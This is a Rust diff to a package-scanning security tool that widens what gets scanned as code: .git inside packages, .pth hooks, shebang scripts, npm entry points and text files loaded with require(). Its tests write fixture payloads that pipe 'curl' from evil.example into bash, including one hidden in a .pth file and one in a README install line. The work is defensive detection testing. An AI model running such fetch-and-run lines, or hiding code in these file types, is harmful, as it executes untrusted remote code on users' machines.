@@ -316,7 +316,7 @@ pub fn is_critical_file(filename: &str) -> bool {
     CRITICAL_EXTENSIONS.iter().any(|ext| lower.ends_with(ext))
 }
 
-pub fn get_extension(filename: &str) -> &str {
+pub fn get_extension(filename: &str) -> &'static str {
     let lower = filename.to_lowercase();
     for ext in CRITICAL_EXTENSIONS {
         if lower.ends_with(ext) {
@@ -326,19 +326,32 @@ pub fn get_extension(filename: &str) -> &str {
     ""
 }
 
+/// Whose files a scan reads.
+#[derive(Clone, Copy, PartialEq, Eq, Debug)]
+pub enum Tree {
+    /// The operator's own checkout, scanned in place.
+    Own,
+    /// Someone else's git checkout (a clone, or `--untrusted` on a directory):
+    /// its root `.git` is git's metadata.
+    Checkout,
+    /// An extracted archive (VSIX, zip, npm tarball, upload): every directory,
+    /// `.git` included, is what the author shipped.
+    Package,
+}
+
 /// Directories not worth scanning. In the operator's own checkout that is
-/// build output and virtualenvs; in someone else's code only the clone's own
-/// `.git`. A package author can name a payload directory `lib/target/` or
-/// `__pycache__/`, and those used to be skipped at any depth.
-/// `node_modules` is always scanned: in a VSIX/CRX it is shipped, executed
-/// code and the obvious place to hide a payload.
-pub fn skip_dir(e: &walkdir::DirEntry, own_tree: bool) -> bool {
+/// build output and virtualenvs; in a checkout of someone else's code only
+/// its own `.git`; in a package nothing. A package author can name a payload
+/// directory `lib/target/`, `__pycache__/` or `.git/`, and those used to be
+/// skipped. `node_modules` is always scanned: in a VSIX/CRX it is shipped,
+/// executed code and the obvious place to hide a payload.
+pub fn skip_dir(e: &walkdir::DirEntry, tree: Tree) -> bool {
     if !e.file_type().is_dir() {
         return false;
     }
     let name = e.file_name().to_string_lossy();
-    if own_tree {
-        [
+    match tree {
+        Tree::Own => [
             ".git",
             "__pycache__",
             ".tox",
@@ -347,9 +360,9 @@ pub fn skip_dir(e: &walkdir::DirEntry, own_tree: bool) -> bool {
             "venv",
             ".venv",
         ]
-        .contains(&name.as_ref())
-    } else {
-        e.depth() == 1 && name == ".git"
+        .contains(&name.as_ref()),
+        Tree::Checkout => e.depth() == 1 && name == ".git",
+        Tree::Package => false,
     }
 }
 
@@ -363,20 +376,22 @@ pub fn scan_directory_filtered<P: AsRef<Path>>(
     custom_yara_dir: Option<&Path>,
     extra_rules: &[Rule],
     changed: Option<&std::collections::HashSet<std::path::PathBuf>>,
-    own_tree: bool,
+    tree: Tree,
 ) -> (usize, usize, Vec<RuleMatch>) {
+    let own_tree = tree == Tree::Own;
     let mut rules = build_rules();
     rules.extend_from_slice(extra_rules);
     let yara_engine = crate::yara_engine::YaraEngine::new(custom_yara_dir);
     let mut total_files = 0usize;
     let mut targets: Vec<Target> = Vec::new();
-    let mut scanned_files = 0usize;
+    // Prose skipped in someone else's tree, kept in case the package runs it.
+    let mut docs: Vec<Target> = Vec::new();
 
     // Phase 1: collect candidate files (same order as the old single pass,
     // so results stay deterministic).
     for entry in WalkDir::new(dir.as_ref())
         .into_iter()
-        .filter_entry(|e| !skip_dir(e, own_tree))
+        .filter_entry(|e| !skip_dir(e, tree))
     {
         let entry = match entry {
             Ok(e) => e,
@@ -390,18 +405,12 @@ pub fn scan_directory_filtered<P: AsRef<Path>>(
         total_files += 1;
 
         let filename = entry.file_name().to_string_lossy().to_string();
-        let critical = is_critical_file(&filename);
         let rel_path = entry
             .path()
             .strip_prefix(dir.as_ref())
             .unwrap_or(entry.path())
             .to_string_lossy()
             .to_string();
-        // SKILL.md and CLAUDE.md are prose to us but instructions to an agent.
-        let agent = crate::agent::is_agent_file(&rel_path);
-        if !critical && !agent && is_doc(&filename) {
-            continue;
-        }
 
         // `--changed-only` filter: skip files not in the changed set
         if let Some(changed) = changed {
@@ -410,54 +419,252 @@ pub fn scan_directory_filtered<P: AsRef<Path>>(
             }
         }
 
-        scanned_files += (critical || agent) as usize;
-        targets.push(Target {
+        // In someone else's tree, what runs decides, not the extension: a
+        // `.pth` hook or an extensionless `#!` script is code.
+        let lang = if own_tree {
+            None
+        } else {
+            runs_as(&filename, entry.path())
+        };
+        let critical = is_critical_file(&filename) || lang.is_some();
+        // SKILL.md and CLAUDE.md are prose to us but instructions to an agent.
+        let agent = crate::agent::is_agent_file(&rel_path);
+        let target = Target {
             rel_path,
             filename,
             abs_path: entry.path().to_path_buf(),
             critical,
-        });
+            lang,
+        };
+        if !critical && !agent && is_doc(&target.filename) {
+            if !own_tree {
+                docs.push(target);
+            }
+            continue;
+        }
+        targets.push(target);
     }
 
-    // Phase 2: scan in parallel. Workers take the next file from a shared
-    // counter: fixed chunks put a `dist/` of large bundles on one or two
-    // workers while the rest sat idle. Results go back into walk order, so
-    // the output is the same as a sequential pass.
+    // npm runs `main`, `bin` and `exports` whatever their extension.
+    if !own_tree {
+        let entry_points: Vec<String> = targets
+            .iter()
+            .filter(|t| t.filename == "package.json")
+            .flat_map(|t| package_entry_points(&t.rel_path, &t.abs_path))
+            .collect();
+        promote(&mut targets, &mut docs, &entry_points);
+    }
+
+    // Phase 2: scan in parallel; Phase 3: files that scanned code
+    // `require`s/`import`s by a non-code name, scanned as code, until no new
+    // one turns up.
+    let ecosystem = ecosystem_of(dir.as_ref());
+    let mut per_file: Vec<Vec<RuleMatch>> = Vec::new();
+    let mut todo: Vec<usize> = (0..targets.len()).collect();
+    while !todo.is_empty() {
+        let (results, required) =
+            scan_targets(&targets, &todo, &rules, &yara_engine, ecosystem, own_tree);
+        per_file.resize_with(targets.len(), Vec::new);
+        for (i, found) in results {
+            per_file[i] = found; // a rescan as code replaces the YARA-only pass
+        }
+        todo.clear();
+        if !own_tree {
+            let before = targets.len();
+            todo = promote(&mut targets, &mut docs, &required);
+            todo.extend(before..targets.len());
+        }
+    }
+    let scanned_files = targets
+        .iter()
+        .filter(|t| t.critical || crate::agent::is_agent_file(&t.rel_path))
+        .count();
+    let matches = per_file.into_iter().flatten().collect();
+
+    (total_files, scanned_files, matches)
+}
+
+/// Scan `targets[i]` for each `i` in `todo`, in parallel. Workers take the
+/// next file from a shared counter: fixed chunks put a `dist/` of large
+/// bundles on one or two workers while the rest sat idle. Also returns the
+/// non-code files the scanned code loads.
+fn scan_targets(
+    targets: &[Target],
+    todo: &[usize],
+    rules: &[Rule],
+    yara_engine: &crate::yara_engine::YaraEngine,
+    ecosystem: &str,
+    own_tree: bool,
+) -> (Vec<(usize, Vec<RuleMatch>)>, Vec<String>) {
     let workers = std::thread::available_parallelism()
         .map(|n| n.get())
         .unwrap_or(4)
         .clamp(1, 16)
-        .min(targets.len().max(1));
+        .min(todo.len().max(1));
     let next = std::sync::atomic::AtomicUsize::new(0);
-    let ecosystem = ecosystem_of(dir.as_ref());
-    let mut per_file: Vec<(usize, Vec<RuleMatch>)> = std::thread::scope(|scope| {
+    std::thread::scope(|scope| {
         let handles: Vec<_> = (0..workers)
             .map(|_| {
                 scope.spawn(|| {
                     let mut yara = yara_engine.scanner(ecosystem);
                     let mut done = Vec::new();
+                    let mut required = Vec::new();
                     loop {
-                        let i = next.fetch_add(1, std::sync::atomic::Ordering::Relaxed);
-                        let Some(target) = targets.get(i) else {
+                        let k = next.fetch_add(1, std::sync::atomic::Ordering::Relaxed);
+                        let Some(&i) = todo.get(k) else {
                             break;
                         };
-                        done.push((i, scan_target(target, &rules, yara.as_mut(), own_tree)));
+                        let (found, loads) =
+                            scan_target(&targets[i], rules, yara.as_mut(), own_tree);
+                        done.push((i, found));
+                        required.extend(loads);
                     }
-                    done
+                    (done, required)
                 })
             })
             .collect();
         // scan_target contains per-file panics, so a worker panic is a bug in
         // this loop: fail the scan rather than report a partial result as clean.
-        handles
-            .into_iter()
-            .flat_map(|h| h.join().expect("scan worker panicked"))
-            .collect()
-    });
-    per_file.sort_unstable_by_key(|(i, _)| *i);
-    let matches = per_file.into_iter().flat_map(|(_, m)| m).collect();
+        let mut results = Vec::new();
+        let mut required = Vec::new();
+        for h in handles {
+            let (done, loads) = h.join().expect("scan worker panicked");
+            results.extend(done);
+            required.extend(loads);
+        }
+        (results, required)
+    })
+}
 
-    (total_files, scanned_files, matches)
+/// Mark the files at `paths` as JavaScript code. Prose files move from
+/// `docs` to the end of `targets`; returns the indices of files that were
+/// already targets but not scanned as code.
+fn promote(targets: &mut Vec<Target>, docs: &mut Vec<Target>, paths: &[String]) -> Vec<usize> {
+    let mut rescan = Vec::new();
+    for path in paths {
+        if let Some(i) = targets.iter().position(|t| &t.rel_path == path) {
+            let t = &mut targets[i];
+            if !t.critical {
+                t.critical = true;
+                t.lang = Some(".js");
+                rescan.push(i);
+            }
+        } else if let Some(i) = docs.iter().position(|t| &t.rel_path == path) {
+            let mut t = docs.remove(i);
+            t.critical = true;
+            t.lang = Some(".js");
+            targets.push(t);
+        }
+    }
+    rescan
+}
+
+/// The language a non-code-named file runs as in someone else's package:
+/// Python executes `.pth` lines at startup, node-gyp runs `<!(...)` in
+/// `binding.gyp`, and an extensionless `#!` script runs as its interpreter.
+fn runs_as(filename: &str, path: &Path) -> Option<&'static str> {
+    if is_critical_file(filename) {
+        return None;
+    }
+    let lower = filename.to_ascii_lowercase();
+    if lower.ends_with(".pth") {
+        return Some(".py");
+    }
+    if lower == "binding.gyp" {
+        return Some(".sh");
+    }
+    if lower.contains('.') {
+        return None;
+    }
+    use std::io::Read;
+    let mut head = [0u8; 128];
+    let n = std::fs::File::open(path).ok()?.read(&mut head).ok()?;
+    let line = String::from_utf8_lossy(&head[..n]);
+    let line = line.strip_prefix("#!")?.lines().next().unwrap_or_default();
+    Some(
+        if ["node", "deno", "bun"].iter().any(|i| line.contains(i)) {
+            ".js"
+        } else if line.contains("python") {
+            ".py"
+        } else if line.contains("ruby") {
+            ".rb"
+        } else if line.contains("perl") {
+            ".pl"
+        } else {
+            ".sh"
+        },
+    )
+}
+
+/// Files a `package.json` makes npm or node run: `main`, `bin` and string
+/// `exports` targets, as root-relative paths.
+fn package_entry_points(rel_path: &str, abs_path: &Path) -> Vec<String> {
+    let Some((bytes, _)) = read_capped(abs_path) else {
+        return Vec::new();
+    };
+    let Ok(json) = serde_json::from_slice::<serde_json::Value>(&bytes) else {
+        return Vec::new();
+    };
+    fn strings(v: &serde_json::Value, out: &mut Vec<String>) {
+        match v {
+            serde_json::Value::String(s) => out.push(s.clone()),
+            serde_json::Value::Array(a) => a.iter().for_each(|v| strings(v, out)),
+            serde_json::Value::Object(o) => o.values().for_each(|v| strings(v, out)),
+            _ => {}
+        }
+    }
+    let mut specs = Vec::new();
+    for key in ["main", "bin", "exports"] {
+        strings(&json[key], &mut specs);
+    }
+    specs
+        .iter()
+        .filter_map(|s| resolve_relative(rel_path, s))
+        .collect()
+}
+
+/// `spec` (`./lib/x.txt`, `lib/x.txt`, `../x`) resolved against the
+/// directory of `from`, as a root-relative path; None outside the root.
+fn resolve_relative(from: &str, spec: &str) -> Option<String> {
+    let mut parts: Vec<&str> = from.split(['/', '\\']).collect();
+    parts.pop();
+    for seg in spec.split('/') {
+        match seg {
+            "" | "." => {}
+            ".." => {
+                parts.pop()?;
+            }
+            s => parts.push(s),
+        }
+    }
+    (!parts.is_empty()).then(|| parts.join(std::path::MAIN_SEPARATOR_STR))
+}
+
+static NON_CODE_REQUIRE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
+    Regex::new(r#"(?:\brequire\s*\(|\bimport\s*\(|\bfrom)\s*['"](\.{1,2}/[^'"\n]+)['"]"#)
+        .expect("valid regex")
+});
+
+/// Relative files this JavaScript loads under a non-code name
+/// (`require("./lib/notes.txt")`): node runs them as JavaScript.
+fn non_code_requires(rel_path: &str, content: &str) -> Vec<String> {
+    NON_CODE_REQUIRE
+        .captures_iter(content)
+        .filter_map(|c| {
+            let spec = c.get(1)?.as_str();
+            let file = spec
+                .rsplit('/')
+                .next()
+                .unwrap_or_default()
+                .to_ascii_lowercase();
+            let code = is_critical_file(&file)
+                || [".json", ".node", ".wasm"]
+                    .iter()
+                    .any(|e| file.ends_with(e))
+                || !file.contains('.');
+            (!code).then(|| resolve_relative(rel_path, spec)).flatten()
+        })
+        .collect()
 }
 
 /// What a scanned tree is, for YARA rules that test `ecosystem`.
@@ -482,6 +689,9 @@ struct Target {
     abs_path: std::path::PathBuf,
     /// Script/manifest file: gets RegEx + entropy rules. Every file gets YARA.
     critical: bool,
+    /// Language the file runs as when its name does not say (`.pth`, a `#!`
+    /// script, a `.txt` that `main` points at); decides which rules apply.
+    lang: Option<&'static str>,
 }
 
 /// Read at most `MAX_SCAN_BYTES`, returning the bytes and the real file size.
@@ -496,8 +706,32 @@ fn read_capped(path: &Path) -> Option<(Vec<u8>, u64)> {
 
 /// Scan one file. A panic in the analysis becomes a finding on that file:
 /// it used to drop every finding of every file in the worker's chunk, and a
-/// non-ASCII comment near a payload was enough to trigger it.
+/// non-ASCII comment near a payload was enough to trigger it. Also returns,
+/// for someone else's JavaScript, the non-code files it loads.
 fn scan_target(
+    target: &Target,
+    rules: &[Rule],
+    yara: Option<&mut yara_x::Scanner<'_>>,
+    own_tree: bool,
+) -> (Vec<RuleMatch>, Vec<String>) {
+    let found = scan_target_matches(target, rules, yara, own_tree);
+    let js = matches!(
+        target
+            .lang
+            .unwrap_or_else(|| get_extension(&target.filename)),
+        ".js" | ".mjs" | ".cjs" | ".ts" | ".jsx" | ".tsx"
+    );
+    let loads = if !own_tree && target.critical && js {
+        read_capped(&target.abs_path)
+            .map(|(b, _)| non_code_requires(&target.rel_path, &String::from_utf8_lossy(&b)))
+            .unwrap_or_default()
+    } else {
+        Vec::new()
+    };
+    (found, loads)
+}
+
+fn scan_target_matches(
     target: &Target,
     rules: &[Rule],
     yara: Option<&mut yara_x::Scanner<'_>>,
@@ -649,7 +883,7 @@ fn scan_bytes(
     } else {
         std::collections::HashSet::new()
     };
-    let ext = get_extension(filename);
+    let ext = target.lang.unwrap_or_else(|| get_extension(filename));
     let lower = std::cell::OnceCell::new();
 
     for rule in rules {
@@ -661,7 +895,7 @@ fn scan_bytes(
             let text = &content[start..end];
             let line = line_of(start);
             if ignored_lines.contains(&line)
-                || is_comment_only_line(&content, line_start(line), start)
+                || is_comment_only_line(&content, line_start(line), start, ext)
             {
                 continue;
             }
@@ -838,10 +1072,20 @@ const COMMENT_SCAN_LIMIT: usize = 1000;
 /// further along may be inside a string, and `var a="/*";eval(atob(...))`
 /// used to hide everything after it. Cost: code followed by a trailing
 /// `/* exec(x) */` on the same line is now reported.
-fn is_comment_only_line(content: &str, line_start: usize, start: usize) -> bool {
+///
+/// `#` opens a comment only where the language says so (`ext` from
+/// `get_extension`, "" for Dockerfile/Makefile): in JS/TS it starts a private
+/// class member and in Rust an attribute, both executed code.
+fn is_comment_only_line(content: &str, line_start: usize, start: usize, ext: &str) -> bool {
     let before = &content[line_start..start];
     let trimmed = before.trim_start();
-    if trimmed.starts_with("//") || trimmed.starts_with('#') {
+    let hash_comment = match ext {
+        ".py" | ".sh" | ".rb" | ".pl" | ".ps1" | ".psm1" | ".yml" | ".yaml" | "" => true,
+        // PHP: `#` comments, but `#[...]` is an attribute.
+        ".php" => !trimmed.starts_with("#["),
+        _ => false,
+    };
+    if trimmed.starts_with("//") || (hash_comment && trimmed.starts_with('#')) {
         return true;
     }
     // A block closed before the match means code follows (` * x */ fetch(evil)`).
@@ -907,8 +1151,8 @@ mod tests {
         std::fs::write(dir.path().join("b.py"), "eval('x')\n").unwrap();
 
         let (total, scanned, mut first) =
-            scan_directory_filtered(dir.path(), None, &[], None, true);
-        let (_, _, mut second) = scan_directory_filtered(dir.path(), None, &[], None, true);
+            scan_directory_filtered(dir.path(), None, &[], None, Tree::Own);
+        let (_, _, mut second) = scan_directory_filtered(dir.path(), None, &[], None, Tree::Own);
 
         let key = |m: &RuleMatch| {
             (
@@ -949,7 +1193,8 @@ mod tests {
         )
         .unwrap();
 
-        let (total, scanned, matches) = scan_directory_filtered(dir.path(), None, &[], None, true);
+        let (total, scanned, matches) =
+            scan_directory_filtered(dir.path(), None, &[], None, Tree::Own);
         assert_eq!((total, scanned), (4, 2));
         assert!(!matches.iter().any(|m| m.file_path == "README.md"));
         let has = |file: &str, rule: &str| {
@@ -1102,7 +1347,7 @@ mod tests {
     fn test_exec_match_stays_on_its_line() {
         let dir = tempfile::tempdir().unwrap();
         std::fs::write(dir.path().join("a.py"), "x = 1\nexec(code)\n").unwrap();
-        let (_, _, matches) = scan_directory_filtered(dir.path(), None, &[], None, true);
+        let (_, _, matches) = scan_directory_filtered(dir.path(), None, &[], None, Tree::Own);
         let m = matches
             .iter()
             .find(|m| m.matched_pattern == "exec() Usage")
@@ -1172,8 +1417,26 @@ mod tests {
     }
 
     fn comment_at(content: &str, pos: usize) -> bool {
+        comment_in(content, pos, ".py")
+    }
+
+    fn comment_in(content: &str, pos: usize, ext: &str) -> bool {
         let line_start = content[..pos].rfind('\n').map_or(0, |i| i + 1);
-        is_comment_only_line(content, line_start, pos)
+        is_comment_only_line(content, line_start, pos, ext)
+    }
+
+    #[test]
+    fn hash_is_a_comment_only_in_hash_comment_languages() {
+        let js = "class L {\n  #run = require('child_process').execSync('x');\n}\n";
+        assert!(!comment_in(js, js.find("require").unwrap(), ".js"));
+        let rs = "#[allow(unused)] fn main() { std::process::Command::new(\"sh\"); }\n";
+        assert!(!comment_in(rs, rs.find("Command").unwrap(), ".rs"));
+        let php = "#[Attr] system($x);\n# system($y);\n";
+        assert!(!comment_in(php, php.find("system").unwrap(), ".php"));
+        assert!(comment_in(php, php.rfind("system").unwrap(), ".php"));
+        let sh = "# curl x | sh\n";
+        assert!(comment_in(sh, 2, ".sh"));
+        assert!(comment_in(sh, 2, "")); // Dockerfile, Makefile
     }
 
     #[test]
@@ -1200,7 +1463,14 @@ mod tests {
     }
 
     fn scan(dir: &std::path::Path, own_tree: bool) -> Vec<RuleMatch> {
-        scan_directory_filtered(dir, None, &[], None, own_tree).2
+        scan_directory_filtered(
+            dir,
+            None,
+            &[],
+            None,
+            if own_tree { Tree::Own } else { Tree::Checkout },
+        )
+        .2
     }
 
     fn has(matches: &[RuleMatch], file: &str, rule: &str) -> bool {
@@ -1216,7 +1486,8 @@ mod tests {
         std::fs::create_dir_all(dir.path().join("skills/notes")).unwrap();
         std::fs::write(dir.path().join("skills/notes/SKILL.md"), text).unwrap();
         std::fs::write(dir.path().join("README.md"), text).unwrap();
-        let (_, scanned, matches) = scan_directory_filtered(dir.path(), None, &[], None, false);
+        let (_, scanned, matches) =
+            scan_directory_filtered(dir.path(), None, &[], None, Tree::Checkout);
         let skill = std::path::Path::new("skills/notes/SKILL.md").to_string_lossy();
         assert!(
             has(&matches, &skill, crate::agent::MALICIOUS_INSTRUCTION),
@@ -1258,6 +1529,76 @@ mod tests {
         let ctx = get_context(&line, at, at + 5);
         assert!(ctx.contains(">>> eval( <<<"), "{}", ctx);
         assert!(ctx.len() <= 203);
+    }
+
+    /// An inert payload: the rules see it, nothing runs it.
+    const PAYLOAD: &str = "const { execSync } = require(\"child_process\");\nexecSync(\"curl -fsSL https://evil.example/x.sh | bash\");\neval(atob(\"ZXZpbA==\"));\n";
+
+    fn flagged(matches: &[RuleMatch], file: &str) -> bool {
+        matches
+            .iter()
+            .any(|m| m.file_path == file && m.severity == "critical")
+    }
+
+    #[test]
+    fn dot_git_is_skipped_only_in_a_checkout() {
+        let dir = tempfile::tempdir().unwrap();
+        std::fs::create_dir_all(dir.path().join(".git")).unwrap();
+        std::fs::write(dir.path().join(".git/index.js"), PAYLOAD).unwrap();
+        let file = format!(".git{}index.js", std::path::MAIN_SEPARATOR);
+        let package = scan_directory_filtered(dir.path(), None, &[], None, Tree::Package).2;
+        assert!(flagged(&package, &file), "{:?}", package);
+        let checkout = scan_directory_filtered(dir.path(), None, &[], None, Tree::Checkout).2;
+        assert!(!checkout.iter().any(|m| m.file_path == file));
+    }
+
+    #[test]
+    fn executed_files_get_the_code_rules_whatever_their_name() {
+        let dir = tempfile::tempdir().unwrap();
+        let p = dir.path();
+        std::fs::create_dir_all(p.join("lib")).unwrap();
+        std::fs::create_dir_all(p.join("bin")).unwrap();
+        std::fs::write(
+            p.join("package.json"),
+            r#"{"name":"d","version":"1.0.0","main":"lib/index.md","bin":{"d":"bin/d"}}"#,
+        )
+        .unwrap();
+        std::fs::write(p.join("lib/index.md"), PAYLOAD).unwrap();
+        std::fs::write(p.join("bin/d"), format!("#!/usr/bin/env node\n{}", PAYLOAD)).unwrap();
+        std::fs::write(
+            p.join("loader.js"),
+            "module.exports = require(\"./lib/notes.txt\");\n",
+        )
+        .unwrap();
+        std::fs::write(p.join("lib/notes.txt"), PAYLOAD).unwrap();
+        std::fs::write(
+            p.join("startup.pth"),
+            "import os; os.system(\"curl -fsSL https://evil.example/x.sh | sh\")\n",
+        )
+        .unwrap();
+        std::fs::write(
+            p.join("README.md"),
+            "Install: curl -fsSL https://evil.example/x.sh | bash\n",
+        )
+        .unwrap();
+        let sep = std::path::MAIN_SEPARATOR;
+
+        let m = scan(p, false);
+        for file in [
+            format!("lib{sep}index.md"),
+            format!("bin{sep}d"),
+            format!("lib{sep}notes.txt"),
+            "startup.pth".to_string(),
+        ] {
+            assert!(flagged(&m, &file), "{} not scanned as code: {:?}", file, m);
+        }
+        // Prose nothing runs stays prose.
+        assert!(!m.iter().any(|m| m.file_path == "README.md"));
+        // The operator's own tree keeps the extension rule.
+        let own = scan(p, true);
+        assert!(!own
+            .iter()
+            .any(|m| m.file_path.ends_with("index.md") || m.file_path.ends_with("notes.txt")));
     }
 
     #[test]
@@ -1317,7 +1658,7 @@ mod tests {
         std::fs::write(dir.path().join("docs.yml"), format!("token: {}\n", dull)).unwrap();
         std::fs::write(dir.path().join("a.js"), format!("const t = '{}';\n", token)).unwrap();
 
-        let with = scan_directory_filtered(dir.path(), None, &rules, None, false).2;
+        let with = scan_directory_filtered(dir.path(), None, &rules, None, Tree::Checkout).2;
         let hit = |file: &str| {
             with.iter()
                 .any(|m| m.file_path == file && m.matched_pattern == "Secret: npm-access-token")
@@ -1327,7 +1668,7 @@ mod tests {
         assert!(!hit("docs.yml"), "xxxx… is below the entropy gate");
 
         // Without --secrets, config files are not read for regex rules at all.
-        let without = scan_directory_filtered(dir.path(), None, &[], None, false).2;
+        let without = scan_directory_filtered(dir.path(), None, &[], None, Tree::Checkout).2;
         assert!(!without
             .iter()
             .any(|m| m.matched_pattern.starts_with("Secret: ")));
